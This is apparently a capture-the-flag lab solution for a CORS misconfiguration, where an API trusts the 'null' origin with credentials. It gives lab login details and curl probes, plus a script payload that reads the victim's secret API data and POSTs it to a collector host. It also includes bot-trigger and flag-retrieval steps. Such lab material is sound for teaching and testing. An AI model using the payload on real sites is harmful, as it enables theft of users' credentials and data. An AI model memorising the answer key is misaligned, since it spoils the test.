# CORS — NullOrigin · Keychest (difficulty: medium)

`GET /api/secret` (login required) returns `{username, api_key, balance, keys_stored}`. The CORS policy allowlists exactly one origin — the literal string `null` — answering `Access-Control-Allow-Origin: null` with `Access-Control-Allow-Credentials: true` ("legacy support for the old sandboxed-iframe widget gallery", see the note on the dashboard). Content running inside a **sandboxed iframe** (`<iframe sandbox="allow-scripts" src="...">`, no `allow-same-origin`) is served from the null origin, so attacker-controlled sandboxed pages get a credentialed cross-site read of the victim's data.

Intended path:
1. Log in at http://victim.target.lab:8119/ as `0xnhsec` / `vlh-tester-01`; check the API: `curl -si -b "sid=<sid>" -H "Origin: null" http://victim.target.lab:8119/api/secret` → ACAO `null`.
2. Store the artifact on the exploit server: `PUT http://attacker.target.lab:8119/pages/exploit.html` with `<script>fetch('http://victim.target.lab:8119/api/secret',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('http://collector.target.lab:8119/collect',{method:'POST',body:d}))</script>` — in a real browser the victim must load it via a sandboxed iframe.
3. Trigger the victim bot (origin `"null"` models the sandboxed iframe): `curl -X POST http://collector.target.lab:8119/victim -H 'Content-Type: application/json' -d '{"url":"http://victim.target.lab:8119/api/secret","origin":"null","referer":"http://attacker.target.lab:8119/pages/exploit.html"}'`
4. `curl http://collector.target.lab:8119/verify` → flag.

Flag: `DSLTV{CORS-NullOrigin-<9-10 digits>}` (event-verified — minted by the verifier, regenerated every restart).
